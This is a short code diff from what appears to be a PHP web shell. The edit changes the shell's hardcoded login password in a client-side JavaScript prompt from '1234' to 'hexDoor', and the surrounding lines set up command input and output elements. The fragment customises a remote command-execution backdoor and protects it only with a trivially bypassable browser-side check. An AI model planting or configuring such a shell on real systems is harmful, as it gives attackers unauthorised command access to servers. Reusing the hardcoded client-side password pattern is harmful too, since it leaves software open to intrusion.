@@ -471,7 +471,7 @@ if (isset($_GET["feature"])) {
 
             window.onload = function() {
                 var password = prompt("Enter in the password");
-                if (password=="1234") {
+                if (password=="hexDoor") {
                     eShellCmdInput = document.getElementById("shell-cmd");
                     eShellContent = document.getElementById("shell-content");
                     updateCwd();
